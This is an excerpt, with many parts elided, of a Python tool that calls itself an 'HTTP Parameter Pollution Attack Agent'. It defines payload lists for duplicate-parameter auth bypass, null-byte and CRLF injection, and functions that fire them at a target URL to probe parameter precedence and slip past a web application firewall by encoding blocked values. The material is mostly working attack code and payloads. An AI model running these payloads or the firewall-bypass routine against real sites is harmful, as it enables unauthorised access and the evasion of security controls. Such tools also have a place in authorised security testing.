...
HPP_PAYLOADS = {
    "duplicate_param": [
        {
            "params": "id=1&id=2",
            "desc": "Duplicate parameter — tests server-side precedence",
        },
        {
            "params": "user=admin&user=guest",
            "desc": "Duplicate user param — tests auth bypass",
        },
        {
    ...
    "encoding_bypass": [
        ...
        {
            "params": "id=1%00&admin=true",
            "desc": "Null byte injection with extra param",
        },
        {
            "params": "search=test%0d%0ainjected:header",
            "desc": "CRLF injection in param value",
        },
    ],
    "array_syntax": [
...
def test_parameter_precedence(url, param_name="id", headers=None):
    ...
    for val1, val2 in test_pairs:
        ...
        try:
            resp = requests.get(
                full_url, headers=hdrs, timeout=10, allow_redirects=False
            )
            body = resp.text[:2000]
            ...
            precedence = (
                "FIRST"
                if uses_first
                else "LAST" if uses_last else "BOTH" if uses_both else "UNKNOWN"
            )
            results.append(
                {
                    "values": [val1, val2],
        ...
        for payload in payloads:
            try:
                if method == "GET":
                    ...
                    resp = requests.get(
                        test_url, headers=hdrs, timeout=10, allow_redirects=False
                    )
                else:
                    resp = requests.post(
                        url,
...
def test_waf_bypass(url, blocked_param, blocked_value, headers=None):
    ...
    tests = [
        ...
        },
        {
            "name": "encoded",
            "params": {
                blocked_param: blocked_value.replace("'", "%27").replace("<", "%3C")
            },
        },
    ...
    for test in tests:
        try:
            ...
            blocked = (
                ...
                or "blocked" in resp.text.lower()[:500]
            )
            results.append(
                {
                    "name": test["name"],
...
def main():
    ...
    parser = argparse.ArgumentParser(
        description="HTTP Parameter Pollution Attack Agent"
    )
